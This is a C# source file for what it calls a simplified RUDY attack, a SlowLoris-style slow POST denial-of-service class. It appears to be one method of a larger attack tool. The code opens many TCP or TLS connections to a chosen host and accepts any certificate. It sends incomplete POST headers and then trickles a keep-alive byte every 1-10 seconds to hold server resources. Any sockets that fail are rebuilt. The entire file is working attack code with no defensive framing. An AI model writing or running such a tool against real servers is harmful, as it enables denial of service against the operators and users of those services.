﻿using System;
using System.IO;
using System.Threading;
using System.Net.Sockets;
using System.Diagnostics;
using System.Net.Security;
using System.Collections.Generic;
using System.Security.Cryptography.X509Certificates;
using ThreadState = System.Threading.ThreadState;

namespace iNetron.Core.Methods.App
{
    /// <summary>
    /// A simplified RUDY attack. Just SlowLoris but with a POST request.
    /// </summary>
    public class srudy
    {
        private class sock
        {
            private Random rGen;
            private StreamWriter sWriter;
            private TcpClient tClient;

            private bool AcceptAnyCert(object sender, X509Certificate certificate,
                X509Chain chain, SslPolicyErrors sslPolicyError) => true;

            public void sendKeepAlive() => sWriter.WriteLine(' ');
            public bool sendHeader(string userAgent)
            {
                // Send typical http POST request, although this time, we're posting to the root '/' oof!
                // usually, R.U.D.Y needs to mess with forms, but idk how to do that so that's why it's called SRudy.
                try
                {
                    sWriter.WriteLine("POST / HTTP/1.1\r\n");
                    sWriter.WriteLine(userAgent + "\r\n");
                    sWriter.WriteLine("Accept-language: en-US,en,q=0.5\r\n");

                    Console.WriteLine("Sent Header!");
                    return true;
                }
                catch
                {
                    Console.Error.WriteLine("Send Header Failed");

                    return false;
                }
            }
            public sock(string addr, bool ssl, int port)
            {
                tClient = new TcpClient();
                do { tClient.Connect(addr, port); } while (!tClient.Connected);

                if (ssl)
                {
                    SslStream secStream = new SslStream(tClient.GetStream(), false, new RemoteCertificateValidationCallback(AcceptAnyCert));
                    sWriter = new StreamWriter(secStream);
                }
                else
                    sWriter = new StreamWriter(tClient.GetStream());

                sWriter.AutoFlush = true;
                rGen = new Random(DateTime.Now.Millisecond * DateTime.UtcNow.Millisecond);
            }
        }

        private string p_address = "127.0.0.1";
        private bool p_secure = false;
        private int p_port = 80;

        private List<sock> liSocks;
        private Thread tKeepAlive;

        public srudy(string address, bool secure = false, int port = 80)
        {
            p_address = address;
            p_secure = secure;
            p_port = port;

            liSocks = new List<sock>();

            tKeepAlive = new Thread(thread_SendKeepAlive);
            tKeepAlive.Start();
        }
        ~srudy()
        {
            if (tKeepAlive != null)
                tKeepAlive.Abort();
        }
        public void createSRudy(int sockets, string ua)
        {
            try
            {
                for (int i = 0; i < sockets; ++i)
                {
                    sock l_sock = new sock(p_address, p_secure, p_port);

                    if (l_sock.sendHeader(ua))
                        liSocks.Add(l_sock);
                    else
                        Console.Error.WriteLine("Socket Add Fail: index = " + i);
                }
            }
            catch { Console.Error.WriteLine("Create SRudy Fail"); }
        }
        private void thread_SendKeepAlive()
        {
            while(true)
            {
                if (tKeepAlive.ThreadState != ThreadState.Running)
                    break;

                // Send keep-alive every 1-10s to keep the server waiting.
                for (int i = 0; i < liSocks.Count; ++i)
                {
                    try { liSocks[i].sendKeepAlive(); }
                    catch
                    {
                        Console.Error.WriteLine("Send Keep Alive Failed");

                        // if a socket is broken or it fails, just recreate it and try again.
                        liSocks[i] = new sock(p_address, p_secure, p_port);
                    }
                }

                Thread.Sleep(new Random().Next(1000, 9999));
            }
        }
    }
}